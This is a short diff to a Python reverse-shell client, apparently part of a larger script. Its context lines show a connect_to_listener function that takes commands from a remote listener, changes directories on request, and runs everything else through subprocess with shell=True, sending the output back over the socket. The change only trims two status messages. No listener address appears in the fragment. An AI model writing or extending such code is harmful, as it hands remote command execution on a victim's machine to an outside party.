@@ -79,9 +79,9 @@ def connect_to_listener():
             path = command[3:].strip()
             try:
                 os.chdir(path)
-                client_socket.send(f"Changed directory to {os.getcwd()}\n".encode())
+                client_socket.send(f"Changed directory".encode())
             except Exception as e:
-                client_socket.send(f"cd error: {e}\n".encode())
+                client_socket.send(f"cd error".encode())
             continue
         output = subprocess.run(command, shell=True, capture_output=True, text=True)
         response = output.stdout + output.stderr
